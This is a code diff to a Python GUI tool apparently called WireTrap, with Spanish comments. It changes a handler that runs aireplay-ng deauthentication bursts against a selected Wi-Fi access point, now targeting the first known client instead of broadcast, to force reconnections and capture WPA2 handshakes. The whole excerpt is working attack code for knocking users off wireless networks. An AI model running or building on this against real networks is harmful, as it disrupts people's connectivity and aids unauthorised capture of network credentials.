@@ -1045,16 +1045,25 @@ class WireTrap(QMainWindow):
             self.selected_ap = None
 
     def _on_wpa2_deauth_clicked(self):
-        """Lanza aireplay-ng contra la tabla completa (FF:FF:FF:FF:FF:FF) temporalmente"""
+        """Lanza aireplay-ng contra un cliente si existe, o en broadcast"""
         if not self.selected_ap: return
         iface = self.wpa2_iface_combo.currentText()
-        self.log_wpa2(f"\\n[💥] RÁFAGA HÍBRIDA: Expulsando clientes temporalmente de {self.selected_ap.bssid} para forzar re-asociaciones...")
+        
+        ap = self.scanner.aps.get(self.selected_ap.bssid)
+        client_mac = "FF:FF:FF:FF:FF:FF"
+        target_name = "la red entera (Broadcast)"
+        
+        if ap and len(ap.clients) > 0:
+            client_mac = list(ap.clients)[0].mac
+            target_name = f"al cliente {client_mac}"
+            
+        self.log_wpa2(f"\\n[💥] RÁFAGA HÍBRIDA: Expulsando a {target_name} de {self.selected_ap.bssid} para forzar handshakes...")
         
         def run_deauth():
             import subprocess
             try:
                 subprocess.run([
-                    "aireplay-ng", "-0", "15", "-a", self.selected_ap.bssid, iface
+                    "aireplay-ng", "-0", "15", "-a", self.selected_ap.bssid, "-c", client_mac, iface
                 ], capture_output=True, timeout=10)
             except Exception as e:
                 pass
